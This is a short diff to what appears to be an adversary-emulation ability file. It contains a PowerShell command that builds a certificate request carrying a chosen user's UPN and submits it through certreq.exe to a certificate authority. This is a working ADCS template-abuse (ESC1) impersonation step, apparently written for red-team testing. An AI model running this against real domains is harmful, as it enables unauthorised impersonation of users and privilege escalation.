@@ -13,8 +13,9 @@
     windows:
       psh:
         command: |
+          cd "C:\Users\Public";
           $shortname = "#{esc1.target_user}";
-          $upn = "$shortname@#{host.domain.name}";
+          $upn = "$shortname@#{domain.name}";
           $template = "#{esc1.template}";
           $inf = @"
           [NewRequest]
@@ -28,7 +29,6 @@
           [Extensions]
           2.5.29.17 = "{text}upn=$upn"
           "@;
-
           Set-Content -Path "request.inf" -Value $inf -Force;
           certreq.exe -new request.inf request.req;
           certreq.exe -submit -attrib "CertificateTemplate:$template" -config "#{adcs.ca.name_full}" request.req cert.cer;
